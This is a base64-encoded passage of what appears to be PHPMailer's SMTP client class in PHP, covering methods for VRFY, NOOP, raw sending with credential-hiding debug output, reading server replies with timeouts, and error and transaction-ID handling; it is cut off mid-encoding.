biBvbmUgb3IgbW9yZSByZWNpcGllbnQKICAgICAqIGNvbW1hbmRzIG1heSBiZSBjYWxsZWQgZm9sbG93ZWQgYnkgYSBkYXRhIGNvbW1hbmQuIFRoaXMgY29tbWFuZAogICAgICogd2lsbCBzZW5kIHRoZSBtZXNzYWdlIHRvIHRoZSB1c2VycyB0ZXJtaW5hbCBpZiB0aGV5IGFyZSBsb2dnZWQKICAgICAqIGluIGFuZCBzZW5kIHRoZW0gYW4gZW1haWwuCiAgICAgKiBJbXBsZW1lbnRzIFJGQyA4MjE6IFNBTUwgPFNQPiBGUk9NOjxyZXZlcnNlLXBhdGg+IDxDUkxGPi4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRmcm9tIFRoZSBhZGRyZXNzIHRoZSBtZXNzYWdlIGlzIGZyb20KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNlbmRBbmRNYWlsKCRmcm9tKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+c2VuZENvbW1hbmQoJ1NBTUwnLCAiU0FNTCBGUk9NOiRmcm9tIiwgMjUwKTsKICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgYW4gU01UUCBWUkZZIGNvbW1hbmQuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSBUaGUgbmFtZSB0byB2ZXJpZnkKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHZlcmlmeSgkbmFtZSkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRDb21tYW5kKCdWUkZZJywgIlZSRlkgJG5hbWUiLCBbMjUwLCAyNTFdKTsKICAgIH0KCiAgICAvKioKICAgICAqIFNlbmQgYW4gU01UUCBOT09QIGNvbW1hbmQuCiAgICAgKiBVc2VkIHRvIGtlZXAga2VlcC1hbGl2ZXMgYWxpdmUsIGRvZXNuJ3QgYWN0dWFsbHkgZG8gYW55dGhpbmcuCiAgICAgKgogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBub29wKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRDb21tYW5kKCdOT09QJywgJ05PT1AnLCAyNTApOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBhbiBTTVRQIFRVUk4gY29tbWFuZC4KICAgICAqIFRoaXMgaXMgYW4gb3B0aW9uYWwgY29tbWFuZCBmb3IgU01UUCB0aGF0IHRoaXMgY2xhc3MgZG9lcyBub3Qgc3VwcG9ydC4KICAgICAqIFRoaXMgbWV0aG9kIGlzIGhlcmUgdG8gbWFrZSB0aGUgUkZDODIxIERlZmluaXRpb24gY29tcGxldGUgZm9yIHRoaXMgY2xhc3MKICAgICAqIGFuZCBfbWF5XyBiZSBpbXBsZW1lbnRlZCBpbiBmdXR1cmUuCiAgICAgKiBJbXBsZW1lbnRzIGZyb20gUkZDIDgyMTogVFVSTiA8Q1JMRj4uCiAgICAgKgogICAgICogQHJldHVybiBib29sCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiB0dXJuKCkKICAgIHsKICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJ1RoZSBTTVRQIFRVUk4gY29tbWFuZCBpcyBub3QgaW1wbGVtZW50ZWQnKTsKICAgICAgICAkdGhpcy0+ZWRlYnVnKCdTTVRQIE5PVElDRTogJyAuICR0aGlzLT5lcnJvclsnZXJyb3InXSwgc2VsZjo6REVCVUdfQ0xJRU5UKTsKCiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCByYXcgZGF0YSB0byB0aGUgc2VydmVyLgogICAgICoKICAgICAqIEBwYXJhbSBzdHJpbmcgJGRhdGEgICAgVGhlIGRhdGEgdG8gc2VuZAogICAgICogQHBhcmFtIHN0cmluZyAkY29tbWFuZCBPcHRpb25hbGx5LCB0aGUgY29tbWFuZCB0aGlzIGlzIHBhcnQgb2YsIHVzZWQgb25seSBmb3IgY29udHJvbGxpbmcgZGVidWcgb3V0cHV0CiAgICAgKgogICAgICogQHJldHVybiBpbnR8Ym9vbCBUaGUgbnVtYmVyIG9mIGJ5dGVzIHNlbnQgdG8gdGhlIHNlcnZlciBvciBmYWxzZSBvbiBlcnJvcgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xpZW50X3NlbmQoJGRhdGEsICRjb21tYW5kID0gJycpCiAgICB7CiAgICAgICAgLy9JZiBTTVRQIHRyYW5zY3JpcHRzIGFyZSBsZWZ0IGVuYWJsZWQsIG9yIGRlYnVnIG91dHB1dCBpcyBwb3N0ZWQgb25saW5lCiAgICAgICAgLy9pdCBjYW4gbGVhayBjcmVkZW50aWFscywgc28gaGlkZSBjcmVkZW50aWFscyBpbiBhbGwgYnV0IGxvd2VzdCBsZXZlbAogICAgICAgIGlmICgKICAgICAgICAgICAgc2VsZjo6REVCVUdfTE9XTEVWRUwgPiAkdGhpcy0+ZG9fZGVidWcgJiYKICAgICAgICAgICAgaW5fYXJyYXkoJGNvbW1hbmQsIFsnVXNlciAmIFBhc3N3b3JkJywgJ1VzZXJuYW1lJywgJ1Bhc3N3b3JkJ10sIHRydWUpCiAgICAgICAgKSB7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJ0NMSUVOVCAtPiBTRVJWRVI6IFtjcmVkZW50aWFscyBoaWRkZW5dJywgc2VsZjo6REVCVUdfQ0xJRU5UKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCdDTElFTlQgLT4gU0VSVkVSOiAnIC4gJGRhdGEsIHNlbGY6OkRFQlVHX0NMSUVOVCk7CiAgICAgICAgfQogICAgICAgIHNldF9lcnJvcl9oYW5kbGVyKGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgY2FsbF91c2VyX2Z1bmNfYXJyYXkoWyR0aGlzLCAnZXJyb3JIYW5kbGVyJ10sIGZ1bmNfZ2V0X2FyZ3MoKSk7CiAgICAgICAgfSk7CiAgICAgICAgJHJlc3VsdCA9IGZ3cml0ZSgkdGhpcy0+c210cF9jb25uLCAkZGF0YSk7CiAgICAgICAgcmVzdG9yZV9lcnJvcl9oYW5kbGVyKCk7CgogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQoKICAgIC8qKgogICAgICogR2V0IHRoZSBsYXRlc3QgZXJyb3IuCiAgICAgKgogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0RXJyb3IoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+ZXJyb3I7CiAgICB9CgogICAgLyoqCiAgICAgKiBHZXQgU01UUCBleHRlbnNpb25zIGF2YWlsYWJsZSBvbiB0aGUgc2VydmVyLgogICAgICoKICAgICAqIEByZXR1cm4gYXJyYXl8bnVsbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0U2VydmVyRXh0TGlzdCgpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5zZXJ2ZXJfY2FwczsKICAgIH0KCiAgICAvKioKICAgICAqIEdldCBtZXRhZGF0YSBhYm91dCB0aGUgU01UUCBzZXJ2ZXIgZnJvbSBpdHMgSEVMTy9FSExPIHJlc3BvbnNlLgogICAgICogVGhlIG1ldGhvZCB3b3JrcyBpbiB0aHJlZSB3YXlzLCBkZXBlbmRlbnQgb24gYXJndW1lbnQgdmFsdWUgYW5kIGN1cnJlbnQgc3RhdGU6CiAgICAgKiAgIDEuIEhFTE8vRUhMTyBoYXMgbm90IGJlZW4gc2VudCAtIHJldHVybnMgbnVsbCBhbmQgcG9wdWxhdGVzICR0aGlzLT5lcnJvci4KICAgICAqICAgMi4gSEVMTyBoYXMgYmVlbiBzZW50IC0KICAgICAqICAgICAkbmFtZSA9PSAnSEVMTyc6IHJldHVybnMgc2VydmVyIG5hbWUKICAgICAqICAgICAkbmFtZSA9PSAnRUhMTyc6IHJldHVybnMgYm9vbGVhbiBmYWxzZQogICAgICogICAgICRuYW1lID09IGFueSBvdGhlciBzdHJpbmc6IHJldHVybnMgbnVsbCBhbmQgcG9wdWxhdGVzICR0aGlzLT5lcnJvcgogICAgICogICAzLiBFSExPIGhhcyBiZWVuIHNlbnQgLQogICAgICogICAgICRuYW1lID09ICdIRUxPJ3wnRUhMTyc6IHJldHVybnMgdGhlIHNlcnZlciBuYW1lCiAgICAgKiAgICAgJG5hbWUgPT0gYW55IG90aGVyIHN0cmluZzogaWYgZXh0ZW5zaW9uICRuYW1lIGV4aXN0cywgcmV0dXJucyBUcnVlCiAgICAgKiAgICAgICBvciBpdHMgb3B0aW9ucyAoZS5nLiBBVVRIIG1lY2hhbmlzbXMgc3VwcG9ydGVkKS4gT3RoZXJ3aXNlIHJldHVybnMgRmFsc2UuCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSBOYW1lIG9mIFNNVFAgZXh0ZW5zaW9uIG9yICdIRUxPJ3wnRUhMTycKICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZ3xib29sfG51bGwKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldFNlcnZlckV4dCgkbmFtZSkKICAgIHsKICAgICAgICBpZiAoISR0aGlzLT5zZXJ2ZXJfY2FwcykgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJ05vIEhFTE8vRUhMTyB3YXMgc2VudCcpOwoKICAgICAgICAgICAgcmV0dXJuIG51bGw7CiAgICAgICAgfQoKICAgICAgICBpZiAoIWFycmF5X2tleV9leGlzdHMoJG5hbWUsICR0aGlzLT5zZXJ2ZXJfY2FwcykpIHsKICAgICAgICAgICAgaWYgKCdIRUxPJyA9PT0gJG5hbWUpIHsKICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c2VydmVyX2NhcHNbJ0VITE8nXTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJ0VITE8nID09PSAkbmFtZSB8fCBhcnJheV9rZXlfZXhpc3RzKCdFSExPJywgJHRoaXMtPnNlcnZlcl9jYXBzKSkgewogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcignSEVMTyBoYW5kc2hha2Ugd2FzIHVzZWQ7IE5vIGluZm9ybWF0aW9uIGFib3V0IHNlcnZlciBleHRlbnNpb25zIGF2YWlsYWJsZScpOwoKICAgICAgICAgICAgcmV0dXJuIG51bGw7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gJHRoaXMtPnNlcnZlcl9jYXBzWyRuYW1lXTsKICAgIH0KCiAgICAvKioKICAgICAqIEdldCB0aGUgbGFzdCByZXBseSBmcm9tIHRoZSBzZXJ2ZXIuCiAgICAgKgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldExhc3RSZXBseSgpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5sYXN0X3JlcGx5OwogICAgfQoKICAgIC8qKgogICAgICogUmVhZCB0aGUgU01UUCBzZXJ2ZXIncyByZXNwb25zZS4KICAgICAqIEVpdGhlciBiZWZvcmUgZW9mIG9yIHNvY2tldCB0aW1lb3V0IG9jY3VycyBvbiB0aGUgb3BlcmF0aW9uLgogICAgICogV2l0aCBTTVRQIHdlIGNhbiB0ZWxsIGlmIHdlIGhhdmUgbW9yZSBsaW5lcyB0byByZWFkIGlmIHRoZQogICAgICogNHRoIGNoYXJhY3RlciBpcyAnLScgc3ltYm9sLiBJZiBpdCBpcyBhIHNwYWNlIHRoZW4gd2UgZG9uJ3QKICAgICAqIG5lZWQgdG8gcmVhZCBhbnl0aGluZyBlbHNlLgogICAgICoKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZXRfbGluZXMoKQogICAgewogICAgICAgIC8vSWYgdGhlIGNvbm5lY3Rpb24gaXMgYmFkLCBnaXZlIHVwIHN0cmFpZ2h0IGF3YXkKICAgICAgICBpZiAoIWlzX3Jlc291cmNlKCR0aGlzLT5zbXRwX2Nvbm4pKSB7CiAgICAgICAgICAgIHJldHVybiAnJzsKICAgICAgICB9CiAgICAgICAgJGRhdGEgPSAnJzsKICAgICAgICAkZW5kdGltZSA9IDA7CiAgICAgICAgc3RyZWFtX3NldF90aW1lb3V0KCR0aGlzLT5zbXRwX2Nvbm4sICR0aGlzLT5UaW1lb3V0KTsKICAgICAgICBpZiAoJHRoaXMtPlRpbWVsaW1pdCA+IDApIHsKICAgICAgICAgICAgJGVuZHRpbWUgPSB0aW1lKCkgKyAkdGhpcy0+VGltZWxpbWl0OwogICAgICAgIH0KICAgICAgICAkc2VsUiA9IFskdGhpcy0+c210cF9jb25uXTsKICAgICAgICAkc2VsVyA9IG51bGw7CiAgICAgICAgd2hpbGUgKGlzX3Jlc291cmNlKCR0aGlzLT5zbXRwX2Nvbm4pICYmICFmZW9mKCR0aGlzLT5zbXRwX2Nvbm4pKSB7CiAgICAgICAgICAgIC8vTXVzdCBwYXNzIHZhcnMgaW4gaGVyZSBhcyBwYXJhbXMgYXJlIGJ5IHJlZmVyZW5jZQogICAgICAgICAgICAvL3NvbHV0aW9uIGZvciBzaWduYWxzIGluc3BpcmVkIGJ5IGh0dHBzOi8vZ2l0aHViLmNvbS9zeW1mb255L3N5bWZvbnkvcHVsbC82NTQwCiAgICAgICAgICAgIHNldF9lcnJvcl9oYW5kbGVyKGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jX2FycmF5KFskdGhpcywgJ2Vycm9ySGFuZGxlciddLCBmdW5jX2dldF9hcmdzKCkpOwogICAgICAgICAgICB9KTsKICAgICAgICAgICAgJG4gPSBzdHJlYW1fc2VsZWN0KCRzZWxSLCAkc2VsVywgJHNlbFcsICR0aGlzLT5UaW1lbGltaXQpOwogICAgICAgICAgICByZXN0b3JlX2Vycm9yX2hhbmRsZXIoKTsKCiAgICAgICAgICAgIGlmICgkbiA9PT0gZmFsc2UpIHsKICAgICAgICAgICAgICAgICRtZXNzYWdlID0gJHRoaXMtPmdldEVycm9yKClbJ2RldGFpbCddOwoKICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoCiAgICAgICAgICAgICAgICAgICAgJ1NNVFAgLT4gZ2V0X2xpbmVzKCk6IHNlbGVjdCBmYWlsZWQgKCcgLiAkbWVzc2FnZSAuICcpJywKICAgICAgICAgICAgICAgICAgICBzZWxmOjpERUJVR19MT1dMRVZFTAogICAgICAgICAgICAgICAgKTsKCiAgICAgICAgICAgICAgICAvL3N0cmVhbV9zZWxlY3QgcmV0dXJucyBmYWxzZSB3aGVuIHRoZSBgc2VsZWN0YCBzeXN0ZW0gY2FsbCBpcyBpbnRlcnJ1cHRlZAogICAgICAgICAgICAgICAgLy9ieSBhbiBpbmNvbWluZyBzaWduYWwsIHRyeSB0aGUgc2VsZWN0IGFnYWluCiAgICAgICAgICAgICAgICBpZiAoc3RyaXBvcygkbWVzc2FnZSwgJ2ludGVycnVwdGVkIHN5c3RlbSBjYWxsJykgIT09IGZhbHNlKSB7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygKICAgICAgICAgICAgICAgICAgICAgICAgJ1NNVFAgLT4gZ2V0X2xpbmVzKCk6IHJldHJ5aW5nIHN0cmVhbV9zZWxlY3QnLAogICAgICAgICAgICAgICAgICAgICAgICBzZWxmOjpERUJVR19MT1dMRVZFTAogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCcnKTsKICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYgKCEkbikgewogICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygKICAgICAgICAgICAgICAgICAgICAnU01UUCAtPiBnZXRfbGluZXMoKTogc2VsZWN0IHRpbWVkLW91dCBpbiAoJyAuICR0aGlzLT5UaW1lbGltaXQgLiAnIHNlYyknLAogICAgICAgICAgICAgICAgICAgIHNlbGY6OkRFQlVHX0xPV0xFVkVMCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIC8vRGVsaWJlcmF0ZSBub2lzZSBzdXBwcmVzc2lvbiAtIGVycm9ycyBhcmUgaGFuZGxlZCBhZnRlcndhcmRzCiAgICAgICAgICAgICRzdHIgPSBAZmdldHMoJHRoaXMtPnNtdHBfY29ubiwgc2VsZjo6TUFYX1JFUExZX0xFTkdUSCk7CiAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJ1NNVFAgSU5CT1VORDogIicgLiB0cmltKCRzdHIpIC4gJyInLCBzZWxmOjpERUJVR19MT1dMRVZFTCk7CiAgICAgICAgICAgICRkYXRhIC49ICRzdHI7CiAgICAgICAgICAgIC8vSWYgcmVzcG9uc2UgaXMgb25seSAzIGNoYXJzIChub3QgdmFsaWQsIGJ1dCBSRkM1MzIxIFM0LjIgc2F5cyBpdCBtdXN0IGJlIGhhbmRsZWQpLAogICAgICAgICAgICAvL29yIDR0aCBjaGFyYWN0ZXIgaXMgYSBzcGFjZSBvciBhIGxpbmUgYnJlYWsgY2hhciwgd2UgYXJlIGRvbmUgcmVhZGluZywgYnJlYWsgdGhlIGxvb3AuCiAgICAgICAgICAgIC8vU3RyaW5nIGFycmF5IGFjY2VzcyBpcyBhIHNpZ25pZmljYW50IG1pY3JvLW9wdGltaXNhdGlvbiBvdmVyIHN0cmxlbgogICAgICAgICAgICBpZiAoIWlzc2V0KCRzdHJbM10pIHx8ICRzdHJbM10gPT09ICcgJyB8fCAkc3RyWzNdID09PSAiXHIiIHx8ICRzdHJbM10gPT09ICJcbiIpIHsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vVGltZWQtb3V0PyBMb2cgYW5kIGJyZWFrCiAgICAgICAgICAgICRpbmZvID0gc3RyZWFtX2dldF9tZXRhX2RhdGEoJHRoaXMtPnNtdHBfY29ubik7CiAgICAgICAgICAgIGlmICgkaW5mb1sndGltZWRfb3V0J10pIHsKICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoCiAgICAgICAgICAgICAgICAgICAgJ1NNVFAgLT4gZ2V0X2xpbmVzKCk6IHN0cmVhbSB0aW1lZC1vdXQgKCcgLiAkdGhpcy0+VGltZW91dCAuICcgc2VjKScsCiAgICAgICAgICAgICAgICAgICAgc2VsZjo6REVCVUdfTE9XTEVWRUwKICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgICAgICAvL05vdyBjaGVjayBpZiByZWFkcyB0b29rIHRvbyBsb25nCiAgICAgICAgICAgIGlmICgkZW5kdGltZSAmJiB0aW1lKCkgPiAkZW5kdGltZSkgewogICAgICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygKICAgICAgICAgICAgICAgICAgICAnU01UUCAtPiBnZXRfbGluZXMoKTogdGltZWxpbWl0IHJlYWNoZWQgKCcgLgogICAgICAgICAgICAgICAgICAgICR0aGlzLT5UaW1lbGltaXQgLiAnIHNlYyknLAogICAgICAgICAgICAgICAgICAgIHNlbGY6OkRFQlVHX0xPV0xFVkVMCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIHJldHVybiAkZGF0YTsKICAgIH0KCiAgICAvKioKICAgICAqIEVuYWJsZSBvciBkaXNhYmxlIFZFUlAgYWRkcmVzcyBnZW5lcmF0aW9uLgogICAgICoKICAgICAqIEBwYXJhbSBib29sICRlbmFibGVkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRWZXJwKCRlbmFibGVkID0gZmFsc2UpCiAgICB7CiAgICAgICAgJHRoaXMtPmRvX3ZlcnAgPSAkZW5hYmxlZDsKICAgIH0KCiAgICAvKioKICAgICAqIEdldCBWRVJQIGFkZHJlc3MgZ2VuZXJhdGlvbiBtb2RlLgogICAgICoKICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0VmVycCgpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5kb192ZXJwOwogICAgfQoKICAgIC8qKgogICAgICogRW5hYmxlIG9yIGRpc2FibGUgdXNlIG9mIFNNVFBVVEY4LgogICAgICoKICAgICAqIEBwYXJhbSBib29sICRlbmFibGVkCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRTTVRQVVRGOCgkZW5hYmxlZCA9IGZhbHNlKQogICAgewogICAgICAgICR0aGlzLT5kb19zbXRwdXRmOCA9ICRlbmFibGVkOwogICAgfQoKICAgIC8qKgogICAgICogR2V0IFNNVFBVVEY4IHVzZS4KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldFNNVFBVVEY4KCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmRvX3NtdHB1dGY4OwogICAgfQoKICAgIC8qKgogICAgICogU2V0IGVycm9yIG1lc3NhZ2VzIGFuZCBjb2Rlcy4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICRtZXNzYWdlICAgICAgVGhlIGVycm9yIG1lc3NhZ2UKICAgICAqIEBwYXJhbSBzdHJpbmcgJGRldGFpbCAgICAgICBGdXJ0aGVyIGRldGFpbCBvbiB0aGUgZXJyb3IKICAgICAqIEBwYXJhbSBzdHJpbmcgJHNtdHBfY29kZSAgICBBbiBhc3NvY2lhdGVkIFNNVFAgZXJyb3IgY29kZQogICAgICogQHBhcmFtIHN0cmluZyAkc210cF9jb2RlX2V4IEV4dGVuZGVkIFNNVFAgY29kZQogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2V0RXJyb3IoJG1lc3NhZ2UsICRkZXRhaWwgPSAnJywgJHNtdHBfY29kZSA9ICcnLCAkc210cF9jb2RlX2V4ID0gJycpCiAgICB7CiAgICAgICAgJHRoaXMtPmVycm9yID0gWwogICAgICAgICAgICAnZXJyb3InID0+ICRtZXNzYWdlLAogICAgICAgICAgICAnZGV0YWlsJyA9PiAkZGV0YWlsLAogICAgICAgICAgICAnc210cF9jb2RlJyA9PiAkc210cF9jb2RlLAogICAgICAgICAgICAnc210cF9jb2RlX2V4JyA9PiAkc210cF9jb2RlX2V4LAogICAgICAgIF07CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXQgZGVidWcgb3V0cHV0IG1ldGhvZC4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nfGNhbGxhYmxlICRtZXRob2QgVGhlIG5hbWUgb2YgdGhlIG1lY2hhbmlzbSB0byB1c2UgZm9yIGRlYnVnZ2luZyBvdXRwdXQsIG9yIGEgY2FsbGFibGUgdG8gaGFuZGxlIGl0CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXREZWJ1Z091dHB1dCgkbWV0aG9kID0gJ2VjaG8nKQogICAgewogICAgICAgICR0aGlzLT5EZWJ1Z291dHB1dCA9ICRtZXRob2Q7CiAgICB9CgogICAgLyoqCiAgICAgKiBHZXQgZGVidWcgb3V0cHV0IG1ldGhvZC4KICAgICAqCiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0RGVidWdPdXRwdXQoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+RGVidWdvdXRwdXQ7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXQgZGVidWcgb3V0cHV0IGxldmVsLgogICAgICoKICAgICAqIEBwYXJhbSBpbnQgJGxldmVsCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXREZWJ1Z0xldmVsKCRsZXZlbCA9IDApCiAgICB7CiAgICAgICAgJHRoaXMtPmRvX2RlYnVnID0gJGxldmVsOwogICAgfQoKICAgIC8qKgogICAgICogR2V0IGRlYnVnIG91dHB1dCBsZXZlbC4KICAgICAqCiAgICAgKiBAcmV0dXJuIGludAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0RGVidWdMZXZlbCgpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5kb19kZWJ1ZzsKICAgIH0KCiAgICAvKioKICAgICAqIFNldCBTTVRQIHRpbWVvdXQuCiAgICAgKgogICAgICogQHBhcmFtIGludCAkdGltZW91dCBUaGUgdGltZW91dCBkdXJhdGlvbiBpbiBzZWNvbmRzCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRUaW1lb3V0KCR0aW1lb3V0ID0gMCkKICAgIHsKICAgICAgICAkdGhpcy0+VGltZW91dCA9ICR0aW1lb3V0OwogICAgfQoKICAgIC8qKgogICAgICogR2V0IFNNVFAgdGltZW91dC4KICAgICAqCiAgICAgKiBAcmV0dXJuIGludAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0VGltZW91dCgpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5UaW1lb3V0OwogICAgfQoKICAgIC8qKgogICAgICogUmVwb3J0cyBhbiBlcnJvciBudW1iZXIgYW5kIHN0cmluZy4KICAgICAqCiAgICAgKiBAcGFyYW0gaW50ICAgICRlcnJubyAgIFRoZSBlcnJvciBudW1iZXIgcmV0dXJuZWQgYnkgUEhQCiAgICAgKiBAcGFyYW0gc3RyaW5nICRlcnJtc2cgIFRoZSBlcnJvciBtZXNzYWdlIHJldHVybmVkIGJ5IFBIUAogICAgICogQHBhcmFtIHN0cmluZyAkZXJyZmlsZSBUaGUgZmlsZSB0aGUgZXJyb3Igb2NjdXJyZWQgaW4KICAgICAqIEBwYXJhbSBpbnQgICAgJGVycmxpbmUgVGhlIGxpbmUgbnVtYmVyIHRoZSBlcnJvciBvY2N1cnJlZCBvbgogICAgICovCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gZXJyb3JIYW5kbGVyKCRlcnJubywgJGVycm1zZywgJGVycmZpbGUgPSAnJywgJGVycmxpbmUgPSAwKQogICAgewogICAgICAgICRub3RpY2UgPSAnQ29ubmVjdGlvbiBmYWlsZWQuJzsKICAgICAgICAkdGhpcy0+c2V0RXJyb3IoCiAgICAgICAgICAgICRub3RpY2UsCiAgICAgICAgICAgICRlcnJtc2csCiAgICAgICAgICAgIChzdHJpbmcpICRlcnJubwogICAgICAgICk7CiAgICAgICAgJHRoaXMtPmVkZWJ1ZygKICAgICAgICAgICAgIiRub3RpY2UgRXJyb3IgIyRlcnJubzogJGVycm1zZyBbJGVycmZpbGUgbGluZSAkZXJybGluZV0iLAogICAgICAgICAgICBzZWxmOjpERUJVR19DT05ORUNUSU9OCiAgICAgICAgKTsKICAgIH0KCiAgICAvKioKICAgICAqIEV4dHJhY3QgYW5kIHJldHVybiB0aGUgSUQgb2YgdGhlIGxhc3QgU01UUCB0cmFuc2FjdGlvbiBiYXNlZCBvbgogICAgICogYSBsaXN0IG9mIHBhdHRlcm5zIHByb3ZpZGVkIGluIFNNVFA6OiRzbXRwX3RyYW5zYWN0aW9uX2lkX3BhdHRlcm5zLgogICAgICogUmVsaWVzIG9uIHRoZSBob3N0IHByb3ZpZGluZyB0aGUgSUQgaW4gcmVzcG9uc2UgdG8gYSBEQVRBIGNvbW1hbmQuCiAgICAgKiBJZiBubyByZXBseSBoYXMgYmVlbiByZWNlaXZlZCB5ZXQsIGl0IHdpbGwgcmV0dXJuIG51bGwuCiAgICAgKiBJZiBubyBwYXR0ZXJuIHdhcyBtYXRjaGVkLCBpdCB3aWxsIHJldHVybiBmYWxzZS4KICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2x8c3RyaW5nfG51bGwKICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHJlY29yZExhc3RUcmFuc2FjdGlvbklEKCkKICAgIHsKICAgICAgICAkcmVwbHkgPSAkdGhpcy0+Z2V0TGFzdFJlcGx5KCk7CgogICAgICAgIGlmIChlbXB0eSgkcmVwbHkpKSB7CiAgICAgICAgICAgICR0aGlzLT5sYXN0X3NtdHBfdHJhbnNhY3Rpb25faWQgPSBudWxsOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0aGlzLT5sYXN0X3NtdHBfdHJhbnNhY3Rpb25faWQgPSBmYWxzZTsKICAgICAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnNtdHBfdHJhbnNhY3Rpb25faWRfcGF0dGVybnMgYXMgJHNtdHBfdHJhbnNhY3Rpb25faWRfcGF0dGVybikgewogICAgICAgICAgICAgICAgJG1hdGNoZXMgPSBbXTsKICAgICAgICAgICAgICAgIGlmIChwcmVnX21hdGNoKCRzbXRwX3RyYW5zYWN0aW9uX2lkX3BhdHRlcm4sICRyZXBseSwgJG1hdGNoZXMpKSB7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmxhc3Rfc210cF90cmFuc2FjdGlvbl9pZCA9IHRyaW0oJG1hdGNoZXNbMV0pOwogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICByZXR